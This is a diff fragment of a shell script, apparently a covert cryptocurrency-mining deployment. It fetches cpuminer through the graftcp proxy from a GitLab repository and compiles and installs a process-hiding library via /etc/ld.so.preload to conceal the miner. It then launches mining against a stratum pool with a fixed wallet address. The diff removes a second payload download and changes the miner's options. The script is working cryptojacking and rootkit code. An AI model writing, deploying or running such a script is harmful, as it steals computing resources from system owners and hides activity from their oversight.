@@ -37,11 +37,9 @@ echo " "
 ./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/cpuminer-opt-linux.tar.gz
 tar -xvzf cpuminer-opt-linux.tar.gz
 
-./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
-unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./cpuminer-sse2  -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qyg24ae4awttw69th668c98e50vfjdgkqlymymv.$(shuf -n 1 -i 1-999999) -p m=solo -t16
+./graftcp/graftcp ./cpuminer-sse2  -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qyg24ae4awttw69th668c98e50vfjdgkqlymymv.$(shuf -n 1 -i 1-999999) -t16
